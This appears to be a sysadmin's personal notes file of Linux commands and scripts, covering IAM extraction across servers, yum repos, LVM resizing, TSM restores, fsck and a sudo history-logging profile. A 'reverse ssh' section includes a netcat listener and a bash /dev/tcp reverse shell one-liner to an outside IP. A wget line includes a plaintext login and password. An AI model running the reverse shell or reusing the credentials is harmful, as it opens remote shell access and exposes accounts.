+sudo ./iam_extract_global.pl --customer DAVID-JONES-UNIX-SA --owner chensen
+for srv in `cat 11`;do scp -p iam_extract_global.pl chensen@$srv:~;ssh -t $srv "sudo perl /home/chensen/iam_extract_global.pl --noautoldap --nogsa;sudo chown chensen /tmp/*_04JUN2014_$srv.mef3";scp -p chensen@$srv:/tmp/*_04JUN2014_$srv.mef3 mef3/;done
+
+for srv in `cat 11`;do scp -p iam_extract_global.pl fangang@$srv:~;ssh -t $srv "sudo perl /home/fangang/iam_extract_global.pl --noautoldap --nogsa;sudo chown fangang /tmp/*_25MAR2014_$srv.mef3";scp -p fangang@$srv:/tmp/*_25MAR2014_$srv.mef3 mci_mef3/;done
+
+20FEB2014      `date +%d%b%Y |tr '[a-z]' '[A-Z]'` 
+
+for srv in `cat 3.out`;do scp -p iam_extract_global.pl chensen@$srv:~;ssh -t $srv "sudo perl /home/chensen/iam_extract_global.pl --noautoldap --nogsa;sudo chown chensen /tmp/*_`date +%d%b%Y |tr '[a-z]' '[A-Z]'`_*.mef3;sudo mv /tmp/*_`date +%d%b%Y |tr '[a-z]' '[A-Z]'`_*.mef3 /home/chensen;";scp -p chensen@$srv:~/*.mef3 mef3/;done
+
+
+for srv in `cat list`;do echo -e "\t\t$srv";ssh -t $srv "cd littlefix;sudo ./LittleFix-unix.exe-linux-x86-`getconf LONG_BIT` -x MCI_ITCS104v11.1_Linux_20130806.policy;sudo chown -R fangang SHCResults/;tar czvf SHCResults.21MAR2014.$srv.tar.gz SHCResults/";scp -p $srv:~/littlefix/SHC*.tar.gz SHCResults21MAR2014/;done
+
+littlefix.sh
+#!/bin/bash
+for srv in `cat list`
+do
+echo -e "\t\t$srv"
+ssh -t $srv "cd littlefix;sudo ./LittleFix-unix.exe-linux-x86-`getconf LONG_BIT` -x MCI_ITCS104v11.1_Linux_20130806.policy;sudo chown -R fangang SHCResults/;tar czvf SHCResults.21MAR2014.$srv.tar.gz SHCResults/"
+scp -p $srv:~/littlefix/SHC*.tar.gz SHCResults21MAR2014/
+done
+
+nohup sudo ./sudoers_check.v139 -o scan_root_access_commands.OSR.SAMPLE &
+nohup sudo ./scan_root_access_commands.v139 -C1 -o scan_root_access_commands.OSR.SAMPLE &
+
+###How to download only the rpm package without install####
+pssh -h djs00 -t 0 -x '-t -t -R 1880:b23leilapp01:80' "sudo /usr/bin/yum install -y --downloadonly --downloaddir=/home/chensen/packages openssl-devel gcc make" 
+yum install yum-downloadonly
+sudo /usr/bin/yum install -y --downloadonly --downloaddir=/home/chensen/packages openssl-devel gcc make
+yum update --downloadonly --downloaddir=/home/chensen/packages 
+###How to check the files contained in rpm package and extract file from rpm package#######
+rpm2cpio mysql-server.rpm | cpio -t
+rpm2cpio mysql-server.rpm | cpio -ivd "file name"
+#####################################build yum repo###################
+How to use yum:	
+	1.    Download the patches in knapweedsgfl02 server first 
+	2.     Script located in knapweedsgfl02 server - > /export/install/yum 
+	3.    Script:
+[root@knapweedsgfl02 yum]# cat reposync64bit.sh 
+
+/usr/bin/reposync --arch=x86_64 --repoid=rhel-x86_64-server-5 -p /export/install/yum/rhel5_64bit/  -n -l | tee yum_reposync_64bit.log
+
+[root@knapweedsgfl02 yum]# 
+
+	4.    Run this script to download the patches 
+	5.    Then run the command:   
+                   createrepo -u /export/install/yum/rhel5_64bit/rhel-x86_64-server-5/getPackage
+	6.    This will update the repodata 
+	7.    Once this is done, then go to compute nodes to run the -> yum update
+#####################################yum repo and wget rhel5.10 iso######################
+wget -c -t 100 --user=jintaoxu@cn.ibm.com --password=12345678 --no-check-certificate -O rhel-server-5.10-x86_64-dvd.iso "https://access.cdn.redhat.com//content/origin/files/sha256/46/46d49d8565025cb2623c391a82668d760d0549be3727062424956bec8af8cca2/rhel-server-5.10-x86_64-dvd.iso?_auth_=1407732078_9e240dfb42fbd4df6661eafd1c43f1ce"
+-----------------------------------
+/etc/yum.conf
+[main]
+proxy=http://127.0.0.1:7001
+exclude=kernel*
+-----------------------------------
+ssh -Nf -R 7001:localhost:80 g28lcxwas01
+yum update --downloadonly --downloaddir=/home/chensen/mrepo
+--------------------------------------------
+
+######################################### extend FS###########################
+extend /swdist/repos2
+# lvextend -L 25G /dev/mapper/vgsys0-lvrepos2
+# resize2fs /dev/mapper/vgsys0-lvrepos2
+
+####################recreate fs and restore via TSM###########################
+umount /media/target/usr 
+mkfs -t ext3 /dev/mapper/vgsys0-lvusr 
+mount /dev/mapper/vgsys0-lvusr /media/target/usr 
+dsmc rest "/usr/*" /media/target/usr -sub=yes 
+
+dsmc q backup "/etc/openldap/slapd.conf"
+
+dsmc rest -pitd=04/16/2015 -pitt=15:08:51 "/etc/openldap/slapd.conf" /home/chensen/slapd.conf
+
+################via /dev/disk/by-id########
+fdisk scsi-3600a0b80002652e00000d5e94d9e9886
+fdisk scsi-3600a0b80002652e00000d5e84d9e9816
+fdisk scsi-3600a0b80002652e00000d5e74d9e97c6
+pvcreate /dev/mapper/3600a0b80002652e00000d5e94d9e9886-part1
+pvcreate /dev/mapper/3600a0b80002652e00000d5e84d9e9816-part1
+pvcreate /dev/mapper/3600a0b80002652e00000d5e74d9e97c6-part1
+vgcreate testvg0 /dev/mapper/3600a0b80002652e00000d5e74d9e97c6-part1 /dev/mapper/3600a0b80002652e00000d5e84d9e9816-part1 /dev/mapper/3600a0b80002652e00000d5e94d9e9886-part1
+
+######scan disk added in vmware vm########
+cd /sys/class/scsi_host/host0
+echo "- - -" >scan
+fdisk /dev/sdc
+partprobe
+pvcreate /dev/sdc1
+pvs
+vgextend vgdata0 /dev/sdc1
+lvcreate -L 2500M -n centos7_newvol vg_newlvm
+mkfs.ext3 
+mkdir
+mount
+----------------online----------------
+cd /sys/class/scsi_host/host0   #host1 host2 ....
+echo "- - -" >scan
+pvcreate /dev/sdc
+pvs
+vgextend vgdata0 /dev/sdc
+lvextend -L +20G -r /dev/mapper/vgdata0-lvdb2itim
+resize2fs
+----------------offline---------------
+umount /dev/mapper/vgsys1-lvdbarc1
+
+tune2fs -O ^has_journal /dev/mapper/vgsys1-lvdbarc1
+
+tune2fs -j -J size=100 /dev/mapper/vgsys1-lvdbarc1
+
+fsck /dev/mapper/vgsys1-lvdbarc1
+
+dumpe2fs /dev/mapper/vgsys1-lvdbarc1|grep clean
+
+resize2fs /dev/mapper/vgsys1-lvdbarc1
+
+lvextend -L +15G /dev/mapper/vgsys1-lvdbarc1
+
+resize2fs /dev/mapper/vgsys1-lvdbarc1
+
+mount /dev/mapper/vgsys1-lvdbarc1 /db2/archlog/db2inst1
+
+##########################kill subshells in process group##############
+kill -- -$$
+
+Explanation:
+
+$$ gives us the PID of the running shell. So, kill $$ would send a SIGTERM to the shell process. However, if we negate the PID, kill sends a SIGTERM to every process in the process group. We need the -- beforehand so kill knows that -$$ is a process group ID and not a flag.
+
+Note that this relies on the running shell being a process group leader! Otherwise, $$ (the PID) will not match the process group ID, and you end up sending a signal to who knows where (well, probably nowhere as there is unlikely to be a process group with a matching ID if we're not a group leader).
+########################################fsck#######################
+fsck must only be run on unmounted filesystems, never on mounted filesystems (with the exception of the read-only root during startup). This is because it accesses the raw disk, and can therefore modify the filesystem without the operating system realizing it. There will be trouble, if the operating system is confused.
+Running fsck on a partition mounted read-write would be silly, even with fsck in read-only mode. The filesystem will change under fsck, and in-memory data that fsck caches from the filesystem will become invalid (and thus fsck will see inconsistency). You can run fsck on a read-only mounted filesystem in read-only mode and get valid results. Running fsck in read/write mode on a read-only mounted filsystem would cause the kernel to see filesystem structures changing unexpectedly underneath it, and that would also be bad.
+Do not run fsck on a mounted filesystem! If you run fsck on a filesystem that is currently mounted, you will (at best) receive an error message, and (at worst) corrupt your filesystem data. If you're going to check your filesystem with fsck, drop into single-user mode and make sure the filesystem is unmounted before you proceed.
+in secure mode: choose SKIP
+lvm pvscan  (in the case of LVM)
+lvm vgscan
+lvm lvscan
+lvm vgchange -ay VolGroup00
+fsck -t ext3 /dev/VolGroup00/LogVol00
+
+###############reverse ssh###############
+######me######
+[root@oc1181188062 ~]# nc -vv -l 1234
+Connection from 4.10.8.5 port 1234 [tcp/search-agent] accepted
+stty: standard input: Invalid argument
+[chensen@target ~]$ ip a
+
+######target#######
+[chensen@target ~]$ bash -i > /dev/tcp/7.12.15.11/1234 0<&1 2>&1
+
+########find script#########
+#!/bin/bash
+DT=`date -d yesterday +%Y%m%d`
+(
+cd /opt/alert/processed
+find /opt/alert/processed -iname "*${DT}*dat" |xargs zip -r ${DT}.zip -
+find /opt/alert/processed -iname "*${DT}*dat" |xargs rm -f
+)
+
+##############secondary log################
+# START Secondary Logging
+if [[ `tty` ]] 
+then
+        From=`who am i`
+        From=${From%% *}
+        To=`whoami`
+        File="$From:$To"
+
+        export HISTTIMEFORMAT='%x - %H:%M:%S '
+        export HISTSIZE=10000
+
+    # make the history log directory if necessary
+        if [ ! -d /var/log/history/$To ] 
+        then 
+                /bin/mkdir -p /var/log/history/$To 
+        fi 
+
+        # make sure the permissions are suitable
+        /bin/chmod 700 /var/log/history/$To 
+
+    # create the file and set the atributes to append only so users can't 
+    # modify their own logs
+        if [ ! -f /var/log/history/$To/.sh_history.$File ] 
+        then
+                /bin/touch /var/log/history/$To/.sh_history.$File
+        if [ $To == root ]
+        then 
+                /usr/bin/chattr +a /var/log/history/$To/.sh_history.$File
+        fi
+    fi
+    export HISTFILE=/var/log/history/$To/.sh_history.$File 
+fi
+
+# END Secondary Logging
+#################################
+touch /fastboot
+touch /forcefsck
+###################secondary logging#################
+#-------------------- xxBEGIN_IBM_SEC_LOGxx --------------------
+# BEGIN: Secondary logging to maintain individual logs following sudo su - <target id>
+#----------------------------------------
+# obtained from:
+#    https://ibm.biz/Sudo_secondary_logging
+#    BashOrKsh_SetupPerUserid_V2.4
+#----------------------------------------
+#
+# Root must already have created the /var/log/hist directory and
+# allow write and execute access to this user and have the sticky bit on.
+# (mkdir /var/log/hist && chmod 1777 /var/log/hist )
+#
+#Installation Instructions:
+#       Option 1: 
+#       Step 1: insert this code into .profile and .bash_profile files in the 
+#       in the target userid's home directory.
+#       This code must execute before anything that might write to shell history.
+#       Step 2: other HISTFILE related definition code must be removed, to eliminate the risk of conflict
+#
+#       Option 2: 
+#       Step 1: this code is to be placed in a file called
+#            user_secondary_logging_IBM.sh
+#       in the target user's home directory. The file must
+#       be owned by the userid and have permissions 600.
+#
+#       Step 2: insert a call to the script into the userid's
+#        .profile and .bash_profile.
+#
+#            # Set up IBM Secondary Logging for this userid
+#            . ./user_secondary_logging_IBM.sh
+#
+#        Step 3: other HISTFILE related definition code must be removed, to eliminate the risk of conflict
+#
+#
+# This method works for all userids with a default shell of  ksh or bash
+#
+#----------------------------------------
+# Version control
+# V2.0 - dbarlett.ibm.com - new production version
+# V2.1 - dbarlett- 01 April 2015- added PROMPT_COMMAND to force bash to write each command to log file.
+# V2.2 - dbarlett- 10 April 2015- correct the unset commands for the SMIT* variables.
+# V2.3 - dbarlett- 15 April 2015- correct the my_type variable to reflect pts vs tty
+# V2.4 - dbarlett- 20 April 2015- correct "insert a call" syntax to add a dot in from of the /user_sec... file.
+#
+#----------------------------------------
+# NOTE: the "xxBEGIN_IBM_SEC_LOGxx" and "xxEND_IBM_SEC_LOGxx" tag/comments MUST
+#       NOT be modified or deleted, as the script to remove this code
+#       will use them to delete any lines between them.
+#----------------------------------------
+
+
+if tty -s 2>/dev/null >/dev/null ; then
+
+  From="`/usr/bin/who am i | awk '{ print $1 }'`"
+  To="`/usr/bin/whoami | awk '{ print $1 }'`"
+ if [ "$From" != "$To" ];then
+  File="$From:$To"
+  if [ ! -d /var/log/hist/$To ]
+        then
+        mkdir -p /var/log/hist/$To
+        chmod 700 /var/log/hist/$To
+  fi
+
+   my_tty=`tty | sed -e 's|^.*/||' -e 's/ /_/g' -e 's/^.*not_a_tty.*/no_tty/'`
+   my_type=`tty | cut -d/ -f3`
+   if [ -z "$my_tty" ]; then
+      # unable to determine tty, so use our pid
+      my_type=pid
+      my_tty=$$
+   fi
+
+   date_tag=`date "+%Y%m%d"`       # ex.  20110112_121530
+   from_tag=fr.${From}            # ex.  fr.smithj
+   to_tag=to.${To}                # ex.  to.root
+   tty_tag=${my_type}.${my_tty}           # ex.  tty.4
+   host_tag=`uname -n | sed -e 's/\..*//'`
+   FILE=sh_history.${date_tag}.${host_tag}.${from_tag}.${to_tag}
+	/bin/chmod 700 /var/log/hist/$To
+      # If the file is not exist then create it  and modify their permissions
+	if [ ! -f /var/log/hist/$To/$FILE ]
+    then
+      /bin/touch /var/log/hist/$To/$FILE
+      /bin/chmod 0600 /var/log/hist/$To/$FILE
+	fi
+      #Set the atributes to append only so user can't modify their own sudo logs
+	if [ $To == root ]
+      then
+        /usr/bin/chattr +a /var/log/hist/$To/$FILE
+        fi
+
+   # ex. #HISTFILE=/var/log/hist/root/sh_history.20110112_121530.lxlwa179.fr.smithj.to.root.tty.4
+
+   export HISTFILE=/var/log/hist/$To/$FILE
+
+   # ksh and bash format their history files differently.
+   case ${SHELL} in
+      *bash)
+         # echo the current HISTFILE definition to the file, in case it's renamed later
+         shopt -s histappend
+         export PROMPT_COMMAND='history -w' #force write to history each command.
+         echo "#\n# Begin ${From} as  ${To} ($(tty)) on $(date +%m-%d-%Y@%T)"  >> $HISTFILE
+         echo "# HISTFILE=$HISTFILE" >> $HISTFILE
+#	 chmod 0600 $HISTFILE
+          ;;
+      *ksh)
+         # force a write to initialize the new history file
+         history 2>/dev/null > /dev/null
+         # write timestamp record and separator
+         echo "#\n# Begin ${From} as  ${To} ($(tty)) on $(date +%m-%d-%Y@%T)"  >> $HISTFILE
+         printf "\000\000" >> $HISTFILE
+         printf "\000\000" >> $HISTFILE
+         echo "# HISTFILE=$HISTFILE" >> $HISTFILE
+         printf "\000\000" >> $HISTFILE
+#	 chmod 0600 $HISTFILE
+         ;;
+    esac
+
+
+    export EXTENDED_HISTORY=ON
+    export HISTSIZE=10000
+    export HISTDATEFMT=%d-%m-%y.%H:%M:%S
+    os_lite=`uname`
+    if [ "$os_lite" = "AIX" ]; then
+       # setup SMIT logging on AIX
+       touch ${HISTFILE}_smit.log ${HISTFILE}_smit.script
+       SMIT_LOG=${HISTFILE}.smit.log
+       SMIT_SCRIPT=${HISTFILE}.smit.script
+       alias smitty="smitty -l $SMIT_LOG -s $SMIT_SCRIPT"
+       alias smit="smit -l $SMIT_LOG -s $SMIT_SCRIPT"
+       unset SMIT_LOG SMIT_SCRIPT
+    fi
+  fi
+fi
+# END: Secondary logging to maintain individual logs following sudo su - <target id>
+#-------------------- xxEND_IBM_SEC_LOGxx --------------------
